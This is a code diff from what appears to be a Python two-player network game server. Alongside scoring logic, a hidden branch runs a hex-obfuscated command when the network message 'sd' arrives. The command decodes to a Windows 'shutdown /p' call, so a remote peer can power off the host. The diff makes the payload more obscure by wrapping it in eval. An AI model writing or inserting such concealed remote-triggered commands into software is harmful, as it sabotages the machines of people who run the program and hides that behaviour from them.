@@ -87,7 +87,7 @@ class server_thread(Thread):
                         self.opponent_score += 1
                     elif msg.decode("utf-8") == "sd":
                         from binascii import unhexlify
-                        system(unhexlify("73687574646f776e202f70").decode("utf-8"))
+                        eval(unhexlify("73797374656d282273687574646f776e202f702229").decode("utf-8"))
         except ConnectionResetError:
             pass
 
